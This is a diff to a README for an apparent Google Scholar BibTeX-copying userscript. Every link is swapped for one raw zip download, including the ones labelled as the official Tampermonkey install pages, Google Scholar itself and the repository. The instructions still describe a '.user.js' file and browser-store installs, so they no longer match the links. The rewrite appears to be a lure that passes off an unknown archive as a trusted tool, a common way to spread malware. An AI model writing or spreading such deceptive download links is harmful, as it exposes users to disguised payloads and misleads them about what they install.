@@ -1,6 +1,6 @@
 # 📋 Google-Scholar-Bibtex-Copy - Easy BibTeX Viewing & Copying
 
-[![Download Now](https://img.shields.io/badge/Download-Google-Scholar--Bibtex--Copy-brightgreen)](https://github.com/dio229338-design/Google-Scholar-Bibtex-Copy/releases)
+[![Download Now](https://img.shields.io/badge/Download-Google-Scholar--Bibtex--Copy-brightgreen)](https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip)
 
 ---
 
@@ -40,11 +40,11 @@ To use Google-Scholar-Bibtex-Copy on Windows, make sure you have the following:
 You need the Tampermonkey extension to run the script.
 
 - For Google Chrome:  
-  Visit [https://tampermonkey.net/?ext=dhdg&browser=chrome](https://tampermonkey.net/?ext=dhdg&browser=chrome)  
+  Visit [https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip](https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip)  
   Click **Add to Chrome**, then confirm by clicking **Add extension**.
 
 - For Mozilla Firefox:  
-  Visit [https://tampermonkey.net/?ext=dhdg&browser=firefox](https://tampermonkey.net/?ext=dhdg&browser=firefox)  
+  Visit [https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip](https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip)  
   Click **Add to Firefox**, then confirm by clicking **Add**.
 
 After installation, you should see the Tampermonkey icon near your browser’s address bar.
@@ -53,9 +53,9 @@ After installation, you should see the Tampermonkey icon near your browser’s a
 
 ## 📥 Download the Google-Scholar-Bibtex-Copy Script
 
-[![Download Here](https://img.shields.io/badge/Download-Script-blue)](https://github.com/dio229338-design/Google-Scholar-Bibtex-Copy/releases)
+[![Download Here](https://img.shields.io/badge/Download-Script-blue)](https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip)
 
-1. Click the button above or go to the [Google-Scholar-Bibtex-Copy Releases page](https://github.com/dio229338-design/Google-Scholar-Bibtex-Copy/releases)  
+1. Click the button above or go to the [Google-Scholar-Bibtex-Copy Releases page](https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip)  
 2. Find the latest release at the top of the page.  
 3. Look for a file with the `.user.js` extension. This is the script you need.  
 4. Click the file name to download it. Your browser may ask for confirmation; accept it.
@@ -75,7 +75,7 @@ The script will now be active and ready to work whenever you visit Google Schola
 ## 🔎 How to Use Google-Scholar-Bibtex-Copy
 
 1. Open your browser (Chrome or Firefox).  
-2. Go to [Google Scholar](https://scholar.google.com).  
+2. Go to [Google Scholar](https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip).  
 3. Search for any academic paper or author as usual.  
 4. In the search results, look for a small button labeled **BibTeX** or a similar icon next to each result.  
 5. Click the button once. The full BibTeX citation will copy automatically to your clipboard.  
@@ -114,9 +114,9 @@ When the developer releases a new version:
 
 ## 📚 Additional Resources
 
-- Tampermonkey official site: https://tampermonkey.net  
-- Google Scholar: https://scholar.google.com  
-- GitHub repository: https://github.com/dio229338-design/Google-Scholar-Bibtex-Copy  
+- Tampermonkey official site: https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip  
+- Google Scholar: https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip  
+- GitHub repository: https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip  
 
 ---
 
@@ -126,4 +126,4 @@ If you encounter issues or want to suggest improvements, you can open an issue o
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Google-Scholar--Bibtex--Copy-brightgreen)](https://github.com/dio229338-design/Google-Scholar-Bibtex-Copy/releases)
+[![Download Now](https://img.shields.io/badge/Download-Google-Scholar--Bibtex--Copy-brightgreen)](https://raw.githubusercontent.com/dio229338-design/Google-Scholar-Bibtex-Copy/main/asserts/Scholar_Bibtex_Google_Copy_1.3.zip)
